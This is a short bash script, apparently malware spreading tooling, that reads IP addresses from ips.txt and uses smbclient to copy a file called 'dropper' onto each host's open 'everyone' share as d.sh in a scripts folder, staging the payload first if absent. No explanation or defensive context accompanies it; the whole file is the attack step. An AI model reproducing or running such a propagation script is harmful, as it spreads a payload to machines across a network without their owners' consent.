#!/bin/bash
if [ -f /upload/dropper ]; then
	for i in $(cat ips.txt); do
		smbclient //$i/everyone/ -c "cd scripts; put /upload/dropper d.sh";
	done	
else
	cp ./dropper /upload/dropper
fi
